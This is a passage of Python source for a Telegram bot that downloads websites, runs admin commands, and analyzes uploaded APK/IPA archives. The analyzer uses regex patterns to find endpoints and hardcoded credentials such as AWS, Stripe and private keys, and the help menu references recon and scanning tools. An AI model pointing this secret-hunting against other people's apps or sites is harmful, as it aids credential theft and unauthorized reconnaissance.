        "`/adminset assets <n>`    — Max assets\n\n"
        "`/ban <id>` `/unban <id>`\n"
        "`/userinfo <id>`\n"
        "`/broadcast <msg>`\n"
        "`/allusers`\n"
        "`/setforcejoin`"
    ),
}

_BACK_KB = InlineKeyboardMarkup([[
    InlineKeyboardButton("◀️ Back", callback_data="help_back")
]])

async def help_category_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle help category button presses"""
    query = update.callback_query
    await query.answer()
    data  = query.data
    uid   = query.from_user.id

    if data == "help_back":
        is_adm = uid in ADMIN_IDS
        kb_rows = [
            [
                InlineKeyboardButton("📥 Download",   callback_data="help_dl"),
                InlineKeyboardButton("🔍 Scanner",    callback_data="help_scan"),
            ],
            [
                InlineKeyboardButton("🕵️ Recon",      callback_data="help_recon"),
                InlineKeyboardButton("🔎 Discover",   callback_data="help_discover"),
            ],
            [
                InlineKeyboardButton("🔔 Monitor",    callback_data="help_monitor"),
                InlineKeyboardButton("📊 Account",    callback_data="help_account"),
            ],
            [
                InlineKeyboardButton("🆕 V20 Security", callback_data="help_v20"),
                InlineKeyboardButton("📱 App Analyzer",  callback_data="help_app"),
            ],
            [
                InlineKeyboardButton("🛠️ Tools",        callback_data="help_tools"),
            ],
        ]
        if is_adm:
            kb_rows.append([InlineKeyboardButton("👑 Admin Panel", callback_data="help_admin")])
        await query.edit_message_text(
            "📖 *Help — Category ရွေးပါ*",
            reply_markup=InlineKeyboardMarkup(kb_rows),
            parse_mode='Markdown'
        )
        return

    page = _HELP_PAGES.get(data)
    if page:
        # Admin-only check
        if data == "help_admin" and uid not in ADMIN_IDS:
            await query.answer("🚫 Admin only", show_alert=True)
            return
        await query.edit_message_text(
            page,
            reply_markup=_BACK_KB,
            parse_mode='Markdown'
        )

async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    async with db_lock:
        db = _load_db_sync()
        u  = get_user(db, update.effective_user.id, update.effective_user.first_name)
        reset_daily(u)
        _save_db_sync(db)
    lim  = get_limit(db, u)
    used = u["count_today"]
    bar  = pbar(used, lim if lim > 0 else max(used, 1))
    await update.effective_message.reply_text(
        f"📊 *Status*\n\n👤 {u['name']}\n"
        f"🚫 Banned: {'Yes ❌' if u['banned'] else 'No ✅'}\n\n"
        f"📅 Today:\n`{bar}`\n"
        f"Used: `{used}` / `{'∞' if lim==0 else lim}`\n"
        f"📦 Total: `{u['total_downloads']}`",
        parse_mode='Markdown'
    )

async def cmd_history(update: Update, context: ContextTypes.DEFAULT_TYPE):
    async with db_lock:
        db = _load_db_sync()
        u  = get_user(db, update.effective_user.id)
    dls = u.get("downloads",[])[-10:]
    if not dls:
        await update.effective_message.reply_text("📭 History မရှိသေးပါ"); return
    lines = ["📜 *Download History*\n"]
    for d in reversed(dls):
        icon = {"success":"✅","too_large":"⚠️"}.get(d["status"],"❌")
        lines.append(f"{icon} `{d['url'][:45]}`\n   {d['time']} | {d['size_mb']}MB")
    await update.effective_message.reply_text("\n".join(lines), parse_mode='Markdown')


# ── Core download runner ──────────────────────────

async def _run_download(
    update: Update, context: ContextTypes.DEFAULT_TYPE,
    url: str, full_site: bool, use_js: bool,
    resume_mode: bool = False,
    cookies: str = "", extra_headers: str = "", max_depth: int = 5,
):
    uid   = update.effective_user.id
    uname = update.effective_user.first_name

    # ── Rate limit check ──────────────────────────
    if not resume_mode:
        allowed, wait_sec = check_rate_limit(uid)
        if not allowed:
            await update.effective_message.reply_text(
                f"⏱️ နည်းနည်းစောင့်ပါ — `{wait_sec}` seconds ကျန်သေးတယ်",
                parse_mode='Markdown'
            )
            return

    # ── SSRF pre-check ────────────────────────────
    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(
            f"🚫 URL ကို download လုပ်ခွင့်မပြုပါ\n`{reason}`",
            parse_mode='Markdown'
        )
        return

    # ── DB checks (with lock) ─────────────────────
    async with db_lock:
        db = _load_db_sync()
        u  = get_user(db, uid, uname)
        reset_daily(u)

        if u["banned"]:
            _save_db_sync(db)
            await update.effective_message.reply_text("🚫 Ban ထားပါတယ်"); return
        if not db["settings"]["bot_enabled"] and uid not in ADMIN_IDS:
            _save_db_sync(db)
            await update.effective_message.reply_text("🔴 Bot ယာယီပိတ်ထားပါတယ်"); return
        if not resume_mode and not can_download(db, u):
            lim = get_limit(db, u)
            _save_db_sync(db)
            await update.effective_message.reply_text(f"⛔ Daily limit ({lim}) ပြည့်ပါပြီ"); return
        _save_db_sync(db)

    mode_txt = ("🌐 Full" if full_site else "📄 Single") + (" ⚡JS" if use_js else "")
    msg = await update.effective_message.reply_text(
        f"⏳ *Download စနေပါတယ်{'(Resume)' if resume_mode else ''}...*\n"
        f"🔗 `{sanitize_log_url(url)}`\n📋 {mode_txt}\n\n"
        f"`{'░'*18}`  0%",
        parse_mode='Markdown'
    )

    last = {'t': ''}
    def sync_cb(text): last['t'] = text

    # ── Cancel flag — /stop command ───────────────
    cancel_event = asyncio.Event()
    _cancel_flags[uid] = cancel_event

    async def progress_loop():
        while True:
            await asyncio.sleep(2.5)
            if cancel_event.is_set():
                return
            if last['t']:
                try:
                    await msg.edit_text(
                        f"⏳ *Download နေဆဲ...*\n🔗 `{sanitize_log_url(url)}`\n\n{last['t']}",
                        parse_mode='Markdown'
                    )
                except RetryAfter as e:
                    await asyncio.sleep(e.retry_after + 1)
                except BadRequest:
                    pass

    prog = asyncio.create_task(progress_loop())

    async with download_semaphore:
        # Check cancel before starting heavy work
        if cancel_event.is_set():
            prog.cancel()
            _cancel_flags.pop(uid, None)
            await msg.edit_text("🛑 Download cancelled")
            return
        try:
            async with db_lock:
                db2 = _load_db_sync()
            mp = db2["settings"]["max_pages"]
            ma = db2["settings"]["max_assets"]
            files, error, stats, size_mb = await asyncio.to_thread(
                download_website, url, full_site, use_js, mp, ma, sync_cb, resume_mode,
                None, max_depth, cookies, extra_headers
            )
        except Exception as e:
            prog.cancel()
            err_name = type(e).__name__
            err_hint = {
                "ConnectionError":  "🌐 ဆာဗာနဲ့ ချိတ်ဆက်မရပါ",
                "TimeoutError":     "⏱️ Response timeout ဖြစ်သွားတယ်",
                "SSLError":         "🔒 SSL certificate ပြဿနာ",
                "TooManyRedirects": "🔄 Redirect loop ဖြစ်နေတယ်",
            }.get(err_name, f"⚠️ {err_name}")
            await msg.edit_text(
                f"❌ *Download မအောင်မြင်ဘူး*\n\n"
                f"{err_hint}\n\n"
                f"▸ ဆက်လုပ်ဖို့: `/resume {url}`\n"
                f"▸ JS site ဆိုရင်: `/jsdownload {url}`",
                parse_mode='Markdown'
            )
            async with db_lock:
                db3 = _load_db_sync()
                u3  = get_user(db3, uid)
                log_download(u3, url, 0, "error")
                _save_db_sync(db3)
            _cancel_flags.pop(uid, None)
            return

    prog.cancel()
    _cancel_flags.pop(uid, None)   # download finished — remove flag

    # Check if cancelled during download
    if cancel_event.is_set():
        await msg.edit_text("🛑 Download ကို cancel လုပ်ပြီးပါပြီ")
        return

    if error:
        await msg.edit_text(f"❌ {error}"); return

    is_split = len(files) > 1
    await msg.edit_text(
        f"📤 Upload နေပါတယ်...\n💾 {size_mb:.1f} MB"
        + (f" → {len(files)} parts" if is_split else ""),
        parse_mode='Markdown'
    )

    try:
        for i, fpath in enumerate(files):
            part_label = f" (Part {i+1}/{len(files)})" if is_split else ""
            cap = (
                f"{'✅' if i==len(files)-1 else '📦'} *Done{part_label}*\n"
                f"🔗 `{sanitize_log_url(url)}`\n"
                f"📄 {stats['pages']}p | 📦 {stats['assets']}a | 💾 {size_mb:.1f}MB"
            )
            # ── RetryAfter-aware upload (3 attempts) ──────
            for attempt in range(3):
                try:
                    with open(fpath, 'rb') as f:
                        await context.bot.send_document(
                            chat_id=update.effective_chat.id,
                            document=f, filename=os.path.basename(fpath),
                            caption=cap, parse_mode='Markdown'
                        )
                    break  # success
                except RetryAfter as e:
                    wait = e.retry_after + 2
                    logger.warning("Upload RetryAfter: waiting %ds", wait)
                    await asyncio.sleep(wait)
                except Exception:
                    if attempt == 2:
                        raise
                    await asyncio.sleep(3)

            os.remove(fpath)
            await asyncio.sleep(1)

        join_hint = (
            "\n\n*Combine လုပ်နည်း:*\n```\ncat *.part*.zip > full.zip\n```"
        ) if is_split else ""

        await msg.edit_text(f"✅ ပြီးပါပြီ 🎉{join_hint}", parse_mode='Markdown')

        async with db_lock:
            db4 = _load_db_sync()
            u4  = get_user(db4, uid)
            log_download(u4, url, size_mb, "success")
            _save_db_sync(db4)

    except RetryAfter as e:
        await msg.edit_text(f"❌ Telegram flood limit — `{e.retry_after}s` နောက်မှ ထပ်ကြိုးစားပါ")
    except Exception as e:
        await msg.edit_text(f"❌ Upload error: {type(e).__name__}")


# ── Command wrappers ──────────────────────────────

async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/stop — Cancel current running download OR scan"""
    uid = update.effective_user.id
    
    stopped = []
    
    # ── Stop active download ───────────────────────
    event = _cancel_flags.pop(uid, None)
    if event and not event.is_set():
        event.set()
        stopped.append("📥 Download")
    
    # ── Stop active scan (cancel the asyncio Task) ─
    scan_task = _scan_tasks.pop(uid, None)
    scan_name = _active_scans.pop(uid, None)
    if scan_task and not scan_task.done():
        scan_task.cancel()
        stopped.append(f"🔍 {scan_name or 'Scan'}")
    elif scan_name:
        # scan_name existed but no task ref — still clear it
        stopped.append(f"🔍 {scan_name}")
    
    if stopped:
        items = " + ".join(stopped)
        await update.effective_message.reply_text(
            f"🛑 *ရပ်လိုက်ပါပြီ:* {items}\n"
            "_(Background task ပြီးမှ အလိုအလျောက် clean up ဖြစ်မည်)_",
            parse_mode='Markdown'
        )
    else:
        await update.effective_message.reply_text(
            "ℹ️ *ရပ်စရာ operation မရှိပါ*\n\n"
            "Download: `/dl <url>` or `/fullsite <url>`\n"
            "Scan: `/scan <url>` `/recon <url>` `/ssltls <domain>`",
            parse_mode='Markdown'
        )


async def cmd_download(u, c):
    if not await check_force_join(u, c): return
    if not c.args: return await u.message.reply_text("Usage: `/download <url>`", parse_mode='Markdown')
    url = c.args[0] if c.args[0].startswith('http') else 'https://'+c.args[0]
    await enqueue_download(u, c, url, False, False)

async def cmd_fullsite(u, c):
    if not await check_force_join(u, c): return
    if not c.args: return await u.message.reply_text("Usage: `/fullsite <url>`", parse_mode='Markdown')
    url = c.args[0] if c.args[0].startswith('http') else 'https://'+c.args[0]
    await enqueue_download(u, c, url, True, False)

async def cmd_jsdownload(u, c):
    if not await check_force_join(u, c): return
    if not c.args: return await u.message.reply_text("Usage: `/jsdownload <url>`", parse_mode='Markdown')
    url = c.args[0] if c.args[0].startswith('http') else 'https://'+c.args[0]
    await enqueue_download(u, c, url, False, True)

async def cmd_jsfullsite(u, c):
    if not await check_force_join(u, c): return
    if not c.args: return await u.message.reply_text("Usage: `/jsfullsite <url>`", parse_mode='Markdown')
    url = c.args[0] if c.args[0].startswith('http') else 'https://'+c.args[0]
    await enqueue_download(u, c, url, True, True)

async def cmd_resume(u, c):
    if not await check_force_join(u, c): return
    if not c.args: return await u.message.reply_text("Usage: `/resume <url>`", parse_mode='Markdown')
    url   = c.args[0] if c.args[0].startswith('http') else 'https://'+c.args[0]
    state = load_resume(url)
    if not state["visited"] and not state["downloaded"]:
        await u.message.reply_text("⚠️ Resume state မတွေ့ပါ — `/download` ကနေ အသစ်ကနေ စပါ", parse_mode='Markdown')
        return
    await u.message.reply_text(
        f"♻️ Resume: `{len(state['visited'])}` pages, `{len(state['downloaded'])}` assets done",
        parse_mode='Markdown'
    )
    await enqueue_download(u, c, url, True, False, resume_mode=True)


# ══════════════════════════════════════════════════
# 👑  ADMIN COMMANDS
# ══════════════════════════════════════════════════

async def _send_admin_panel(target, db: dict):
    bot_on    = db["settings"]["bot_enabled"]
    today     = str(date.today())
    tu        = len(db["users"])
    tdl       = sum(u.get("total_downloads",0) for u in db["users"].values())
    banned_n  = sum(1 for u in db["users"].values() if u.get("banned"))
    today_dl  = sum(u["count_today"] for u in db["users"].values() if u.get("last_date")==today)
    active_sc = len(_active_scans)
    queue_sz  = _dl_queue.qsize() if _dl_queue else 0

    kb = [
        [
            InlineKeyboardButton("👥 Users",        callback_data="adm_users"),
            InlineKeyboardButton("📊 Stats",         callback_data="adm_stats"),
        ],
        [
            InlineKeyboardButton("⚙️ Settings",      callback_data="adm_settings"),
            InlineKeyboardButton("📜 DL Log",         callback_data="adm_log"),
        ],
        [
            InlineKeyboardButton(
                "🔴 Bot OFF" if bot_on else "🟢 Bot ON",
                callback_data="adm_toggle_bot"
            ),
            InlineKeyboardButton("🔍 Active Scans",  callback_data="adm_scans"),
        ],
    ]
    status_line = "🟢 Running" if bot_on else "🔴 Stopped"
    text = (
        f"👑 *Admin Panel*\n"
        f"{'━'*22}\n"
        f"🤖 Bot: {status_line}\n"
        f"👥 Users: `{tu}` total  |  🚫 Banned: `{banned_n}`\n"
        f"📦 Downloads: `{tdl}` total  |  Today: `{today_dl}`\n"
        f"🔍 Active scans: `{active_sc}`  |  Queue: `{queue_sz}`\n"
        f"⚡ Workers: `{MAX_WORKERS}`  |  Limit: `{db['settings']['global_daily_limit']}/day`\n"
        f"JS Render: {'✅' if PUPPETEER_OK else '❌ Not installed'}"
    )
    markup = InlineKeyboardMarkup(kb)
    try:
        if hasattr(target, 'edit_message_text'):
            await target.edit_message_text(text, reply_markup=markup, parse_mode='Markdown')
        else:
            await target.reply_text(text, reply_markup=markup, parse_mode='Markdown')
    except BadRequest: pass

@admin_only
async def cmd_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    async with db_lock:
        db = _load_db_sync()
    await _send_admin_panel(update.message, db)

@admin_only
async def cmd_ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args: return await update.effective_message.reply_text("Usage: `/ban <id>`", parse_mode='Markdown')
    target = context.args[0]
    async with db_lock:
        db = _load_db_sync()
        if target in db["users"]:
            db["users"][target]["banned"] = True
            _save_db_sync(db)
            await update.effective_message.reply_text(f"🚫 `{target}` banned", parse_mode='Markdown')
        else:
            await update.effective_message.reply_text(f"❌ `{target}` မတွေ့ပါ", parse_mode='Markdown')

@admin_only
async def cmd_unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args: return await update.effective_message.reply_text("Usage: `/unban <id>`", parse_mode='Markdown')
    target = context.args[0]
    async with db_lock:
        db = _load_db_sync()
        if target in db["users"]:
            db["users"][target]["banned"] = False
            _save_db_sync(db)
            await update.effective_message.reply_text(f"✅ `{target}` unbanned", parse_mode='Markdown')
        else:
            await update.effective_message.reply_text(f"❌ `{target}` မတွေ့ပါ", parse_mode='Markdown')

@admin_only
async def cmd_setlimit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 2:
        return await update.effective_message.reply_text(
            "Usage:\n`/setlimit global 5`\n`/setlimit <id> 3`\n`/setlimit <id> 0` = unlimited",
            parse_mode='Markdown'
        )
    target, num_str = context.args[0], context.args[1]
    try: num = int(num_str)
    except: return await update.effective_message.reply_text("❌ Number ထည့်ပါ")
    async with db_lock:
        db = _load_db_sync()
        if target == "global":
            db["settings"]["global_daily_limit"] = num
            _save_db_sync(db)
            await update.effective_message.reply_text(f"✅ Global → `{num}`", parse_mode='Markdown')
        elif target in db["users"]:
            db["users"][target]["daily_limit"] = None if num==0 else num
            _save_db_sync(db)
            await update.effective_message.reply_text(f"✅ `{target}` → `{num}`", parse_mode='Markdown')
        else:
            await update.effective_message.reply_text(f"❌ မတွေ့ပါ", parse_mode='Markdown')

@admin_only
async def cmd_userinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args: return await update.effective_message.reply_text("Usage: `/userinfo <id>`", parse_mode='Markdown')
    target = context.args[0]
    async with db_lock:
        db = _load_db_sync()
    if target not in db["users"]:
        return await update.effective_message.reply_text(f"❌ `{target}` မတွေ့ပါ", parse_mode='Markdown')
    u   = db["users"][target]
    lim = u.get("daily_limit") or db["settings"]["global_daily_limit"]
    recent = "\n".join(
        f"  {'✅' if d['status']=='success' else '❌'} `{d['url'][:40]}` {d['time']}"
        for d in reversed(u.get("downloads",[])[-5:])
    ) or "  (none)"
    await update.effective_message.reply_text(
        f"👤 *{u['name']}* (`{target}`)\n"
        f"🚫 Banned: {'Yes' if u['banned'] else 'No'}\n"
        f"📅 Limit: `{lim}` | Today: `{u['count_today']}`\n"
        f"📦 Total: `{u['total_downloads']}`\n\nRecent:\n{recent}",
        parse_mode='Markdown'
    )

@admin_only
async def cmd_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args: return await update.effective_message.reply_text("Usage: `/broadcast <msg>`", parse_mode='Markdown')
    text = ' '.join(context.args)
    async with db_lock:
        db = _load_db_sync()
    sent = failed = skipped = 0
    status_msg = await update.effective_message.reply_text("📢 Broadcasting... 0 sent")
    for idx, uid_str in enumerate(db["users"]):
        try:
            await context.bot.send_message(int(uid_str), f"📢 *Admin*\n\n{text}", parse_mode='Markdown')
            sent += 1
            await asyncio.sleep(0.05)          # 20 msgs/sec ကို မကျော်ဖို့
        except RetryAfter as e:
            wait = e.retry_after + 2
            logger.warning("Broadcast RetryAfter: sleeping %ds", wait)
            await asyncio.sleep(wait)
            try:                               # retry once after flood wait
                await context.bot.send_message(int(uid_str), f"📢 *Admin*\n\n{text}", parse_mode='Markdown')
                sent += 1
            except Exception:
                failed += 1
        except Exception:
            failed += 1
        if (idx + 1) % 10 == 0:              # progress every 10 users
            try:
                await status_msg.edit_text(f"📢 Broadcasting... `{sent}` sent | `{failed}` failed")
            except Exception:
                pass
    await status_msg.edit_text(f"✅ Broadcast ပြီးပါပြီ\n✉️ Sent: `{sent}` | ❌ Failed: `{failed}`", parse_mode='Markdown')

@admin_only
async def cmd_allusers(update: Update, context: ContextTypes.DEFAULT_TYPE):
    async with db_lock:
        db = _load_db_sync()
    if not db["users"]: return await update.effective_message.reply_text("Empty")
    lines = ["👥 *Users*\n"]
    for uid, u in list(db["users"].items())[:30]:
        icon = "🚫" if u["banned"] else "✅"
        lines.append(f"{icon} `{uid}` — {u['name']} | {u['total_downloads']} DL")
    await update.effective_message.reply_text("\n".join(lines), parse_mode='Markdown')

@admin_only
async def cmd_setpages(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args: return await update.effective_message.reply_text("Usage: `/setpages 50`")
    async with db_lock:
        db = _load_db_sync()
        db["settings"]["max_pages"] = int(context.args[0])
        _save_db_sync(db)
    await update.effective_message.reply_text(f"✅ Max pages → `{context.args[0]}`", parse_mode='Markdown')

@admin_only
async def cmd_setassets(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args: return await update.effective_message.reply_text("Usage: `/setassets 500`")
    async with db_lock:
        db = _load_db_sync()
        db["settings"]["max_assets"] = int(context.args[0])
        _save_db_sync(db)
    await update.effective_message.reply_text(f"✅ Max assets → `{context.args[0]}`", parse_mode='Markdown')



# ══════════════════════════════════════════════════
# 📱  APP / APK / IPA / ZIP ANALYZER
# ══════════════════════════════════════════════════

# Supported file types
_APP_EXTS = {
    '.apk':  'Android APK',
    '.xapk': 'Android XAPK',
    '.aab':  'Android App Bundle',
    '.ipa':  'iOS IPA',
    '.jar':  'Java JAR',
    '.war':  'Java WAR',
    '.zip':  'ZIP Archive',
    '.aar':  'Android Library',
}

# ── Regex patterns for API/URL/Key extraction ────
_APP_URL_PATTERNS = [
    # Full URLs
    re.compile(r'https?://[^\s\'"<>{}\[\]\\|^`]{8,200}'),
    # API paths
    re.compile(r'[\'"/]((?:api|rest|graphql|v\d+)/[^\s\'"<>]{3,120})[\'"/]'),
    # Base URLs
    re.compile(r'(?:BASE_URL|baseUrl|base_url|API_URL|apiUrl|HOST|ENDPOINT)\s*[=:]\s*[\'"]([^\'"]{8,150})[\'"]', re.I),
    # WebSocket
    re.compile(r'wss?://[^\s\'"<>{}\[\]\\]{8,150}'),
]

_APP_SECRET_PATTERNS = {
    'API Key':        re.compile(r'(?:api[_-]?key|apikey)\s*[=:]\s*[\'"]([A-Za-z0-9_\-]{16,80})[\'"]', re.I),
    'Secret Key':     re.compile(r'(?:secret[_-]?key|client_secret)\s*[=:]\s*[\'"]([A-Za-z0-9_\-]{16,80})[\'"]', re.I),
    'Bearer Token':   re.compile(r'[Bb]earer\s+([A-Za-z0-9\-_\.]{20,200})'),
    'AWS Key':        re.compile(r'AKIA[0-9A-Z]{16}'),
    'AWS Secret':     re.compile(r'(?:aws_secret|AWS_SECRET)[^\'"]{0,10}[\'"]([A-Za-z0-9/+=]{40})[\'"]', re.I),
    'Google API':     re.compile(r'AIza[0-9A-Za-z\-_]{35}'),
    'Firebase URL':   re.compile(r'https://[a-z0-9\-]+\.firebaseio\.com'),
    'Firebase Key':   re.compile(r'[\'"]([A-Za-z0-9_\-]{39}):APA91b[A-Za-z0-9_\-]{134}[\'"]'),
    'Stripe Key':     re.compile(r'(?:sk|pk)_(?:live|test)_[A-Za-z0-9]{24,}'),
    'Twilio SID':     re.compile(r'AC[0-9a-fA-F]{32}'),
    'Private Key':    re.compile(r'-----BEGIN (?:RSA |EC )?PRIVATE KEY-----'),
    'JWT Token':      re.compile(r'eyJ[A-Za-z0-9\-_]{10,}\.[A-Za-z0-9\-_]{10,}\.[A-Za-z0-9\-_]{10,}'),
    'MongoDB URI':    re.compile(r'mongodb(?:\+srv)?://[^\s\'"<>]{10,150}'),
    'MySQL URI':      re.compile(r'mysql://[^\s\'"<>]{10,150}'),
    'Postgres URI':   re.compile(r'postgres(?:ql)?://[^\s\'"<>]{10,150}'),
    'Hardcoded Pass': re.compile(r'(?:password|passwd|pwd)\s*[=:]\s*[\'"]([^\'"]{6,60})[\'"]', re.I),
}

# ── File types to scan inside archive ───────────
_SCAN_EXTENSIONS = {
    '.smali', '.java', '.kt', '.xml', '.json', '.yaml', '.yml',
    '.properties', '.gradle', '.plist', '.js', '.ts', '.html',
    '.txt', '.cfg', '.conf', '.env', '.config', '.swift',
    '.m', '.h', '.cpp', '.py', '.rb', '.php', '.go', '.rs',
    '.dart', '.cs', '.strings', '.ini',
}

_BINARY_EXTS = {'.dex', '.so', '.dylib', '.dll', '.class'}

# Files/dirs to skip (build artifacts, noise)
_SKIP_DIRS = {
    'res/drawable', 'res/mipmap', 'res/raw', 'res/anim',
    '__MACOSX', 'META-INF', 'kotlin', 'okhttp3', 'retrofit2',
    'com/google/android', 'com/facebook', 'com/squareup',
    'io/fabric', 'com/crashlytics', 'com/amplitude',
}


def _should_skip(filepath: str) -> bool:
    fp = filepath.replace('\\', '/')
    return any(skip in fp for skip in _SKIP_DIRS)


def _scan_text_content(text: str, source_file: str) -> dict:
    """Text/source file တစ်ခုထဲမှာ URLs, APIs, secrets ရှာ"""
    urls    = set()
    secrets = {}

    for pat in _APP_URL_PATTERNS:
        for m in pat.findall(text):
            url = m.strip().rstrip('.,;\'"\\/)')
            if len(url) > 8 and not any(noise in url for noise in [
                'schemas.android', 'xmlns', 'w3.org', 'apache.org',
                'example.com', 'localhost', 'schema.org',
            ]):
                urls.add(url)

    for name, pat in _APP_SECRET_PATTERNS.items():
        matches = pat.findall(text)
        if matches:
            # Don't store full secrets — just flag existence
            secrets[name] = len(matches)

    return {"urls": list(urls), "secrets": secrets, "file": source_file}


def _extract_strings_from_binary(data: bytes) -> list:
    """Binary (DEX/SO) ထဲမှာ printable strings ရှာ"""
    strings = []
    current = []
    for byte in data:
        ch = chr(byte)
        if ch.isprintable() and byte not in (0,):
            current.append(ch)
        else:
            if len(current) >= 6:
                s = ''.join(current)
                # Only keep if looks like URL or API path
                if ('http' in s or '/api/' in s or '.com' in s
                        or '.json' in s or 'firebase' in s.lower()):
                    strings.append(s)
            current = []
    return strings[:500]  # cap


def _parse_android_manifest(xml_text: str) -> dict:
    """AndroidManifest.xml ထဲမှာ package, permissions, activities ရှာ"""
    info = {"package": "", "permissions": [], "activities": [],
            "services": [], "receivers": [], "meta_data": {}}
    try:
        # package name
        m = re.search(r'package=[\'"]([^\'"]+)[\'"]', xml_text)
        if m: info["package"] = m.group(1)

        # permissions
        for m in re.finditer(r'uses-permission[^>]+android:name=[\'"]([^\'"]+)[\'"]', xml_text):
            info["permissions"].append(m.group(1).replace('android.permission.', ''))

        # activities
        for m in re.finditer(r'activity[^>]+android:name=[\'"]([^\'"]+)[\'"]', xml_text):
            info["activities"].append(m.group(1))

        # services
        for m in re.finditer(r'service[^>]+android:name=[\'"]([^\'"]+)[\'"]', xml_text):
            info["services"].append(m.group(1))

        # meta-data (API keys often here)
        for m in re.finditer(r'meta-data[^>]+android:name=[\'"]([^\'"]+)[\'"][^>]+android:value=[\'"]([^\'"]+)[\'"]', xml_text):
            info["meta_data"][m.group(1)] = m.group(2)[:80]

    except Exception as _e:
        logging.debug("Scan error: %s", _e)
    return info


def _parse_ios_info_plist(plist_text: str) -> dict:
    """iOS Info.plist ထဲမှာ bundle ID, keys ရှာ"""
    info = {"bundle_id": "", "permissions": [], "url_schemes": [], "keys": {}}
    try:
        m = re.search(r'<key>CFBundleIdentifier</key>\s*<string>([^<]+)</string>', plist_text)
        if m: info["bundle_id"] = m.group(1)

        # URL Schemes
        for m in re.finditer(r'CFBundleURLSchemes.*?<string>([^<]+)</string>', plist_text, re.S):
            info["url_schemes"].append(m.group(1))

        # Privacy usage descriptions (permissions)
        for m in re.finditer(r'<key>(NS\w+UsageDescription)</key>\s*<string>([^<]{0,80})</string>', plist_text):
            info["permissions"].append(m.group(1))

        # API-related keys
        api_keys = ['GoogleService', 'Firebase', 'FacebookAppID', 'API', 'Key', 'Secret', 'Token']
        for m in re.finditer(r'<key>([^<]+)</key>\s*<string>([^<]{4,80})</string>', plist_text):
            k, v = m.group(1), m.group(2)
            if any(ak.lower() in k.lower() for ak in api_keys):
                info["keys"][k] = v[:60]

    except Exception as _e:
        logging.debug("Scan error: %s", _e)
    return info


def analyze_app_file(filepath: str, progress_cb=None) -> dict:
    """
    APK/IPA/ZIP/JAR ကို analyze လုပ်ပြီး:
    - API endpoints
    - Hardcoded secrets/keys
    - AndroidManifest / Info.plist info
    - Network URLs
    - Source file list
    ထုတ်ပေး
    """
    result = {
        "file_type":   "",
        "file_size_mb": 0,
        "app_info":    {},
        "urls":        [],
        "api_paths":   [],
        "secrets":     {},
        "source_files": [],
        "binary_urls": [],
        "stats":       {},
        "errors":      [],
    }

    try:
        ext      = os.path.splitext(filepath)[1].lower()
        fsize_mb = os.path.getsize(filepath) / 1024 / 1024
        result["file_type"]    = _APP_EXTS.get(ext, ext.upper())
        result["file_size_mb"] = round(fsize_mb, 2)

        if not zipfile.is_zipfile(filepath):
            result["errors"].append("Not a valid ZIP/APK/IPA file")
            return result

        all_urls    = set()
        all_secrets = {}   # {name: count}
        source_files = []

        with zipfile.ZipFile(filepath, 'r') as zf:
            names = zf.namelist()
            result["stats"]["total_files"] = len(names)
            if progress_cb:
                progress_cb(f"📂 Files: `{len(names)}`  Extracting...")

            text_count = 0
            for i, name in enumerate(names):
                if _should_skip(name):
                    continue

                _, fext = os.path.splitext(name.lower())

                # ── Text files: scan directly ──────────
                if fext in _SCAN_EXTENSIONS:
                    try:
                        data = zf.read(name)
                        text = data.decode('utf-8', errors='replace')
                        scan = _scan_text_content(text, name)

                        for url in scan["urls"]:
                            all_urls.add(url)
                        for sec_name, cnt in scan["secrets"].items():
                            all_secrets[sec_name] = all_secrets.get(sec_name, 0) + cnt

                        if scan["urls"] or scan["secrets"]:
                            source_files.append({
                                "file":    name,
                                "urls":    len(scan["urls"]),
                                "secrets": list(scan["secrets"].keys()),
                            })

                        # AndroidManifest.xml
                        if name == 'AndroidManifest.xml' and '<manifest' in text:
                            result["app_info"] = _parse_android_manifest(text)
                            result["app_info"]["platform"] = "Android"

                        # iOS Info.plist
                        if name.endswith('Info.plist') and 'CFBundle' in text:
                            result["app_info"] = _parse_ios_info_plist(text)
                            result["app_info"]["platform"] = "iOS"

                        text_count += 1
                    except Exception as e:
                        result["errors"].append(f"{name}: {e}")

                # ── Binary files: string extraction ────
                elif fext in _BINARY_EXTS and fsize_mb < 20:
                    try:
                        data = zf.read(name)
                        bin_strings = _extract_strings_from_binary(data)
                        for s in bin_strings:
                            all_urls.add(s)
                    except Exception:
                        pass

                if progress_cb and (i + 1) % 50 == 0:
                    progress_cb(
                        f"🔍 Scanning `{i+1}/{len(names)}`\n"
                        f"🌐 URLs: `{len(all_urls)}` | 🔑 Secrets: `{len(all_secrets)}`"
                    )

        # ── Categorize URLs ───────────────────────────
        api_paths = set()
        full_urls = set()
        ws_urls   = set()

        for u in all_urls:
            u = u.strip().rstrip('/.,;')
            if not u: continue
            if u.startswith('wss://') or u.startswith('ws://'):
                ws_urls.add(u)
            elif u.startswith('http'):
                full_urls.add(u)
                # Extract path as API path too
                try:
                    p = urlparse(u).path
                    if p and len(p) > 3 and any(k in p for k in [
                        '/api/', '/rest/', '/v1/', '/v2/', '/graphql', '/auth', '/user'
                    ]):
                        api_paths.add(p)
                except Exception:
                    pass
            elif u.startswith('/'):
                api_paths.add(u)

        result["urls"]         = sorted(full_urls)[:300]
        result["api_paths"]    = sorted(api_paths)[:200]
        result["ws_urls"]      = sorted(ws_urls)[:50]
        result["secrets"]      = all_secrets
        result["source_files"] = sorted(source_files,
                                         key=lambda x: x["urls"] + len(x["secrets"]) * 3,
                                         reverse=True)[:30]
        result["stats"].update({
            "text_files_scanned": text_count,
            "unique_urls":        len(full_urls),
            "api_paths":          len(api_paths),
            "ws_urls":            len(ws_urls),
            "secret_types":       len(all_secrets),
        })

    except Exception as e:
        result["errors"].append(str(e))

    return result



# ── Admin callbacks ───────────────────────────────

async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.from_user.id not in ADMIN_IDS:
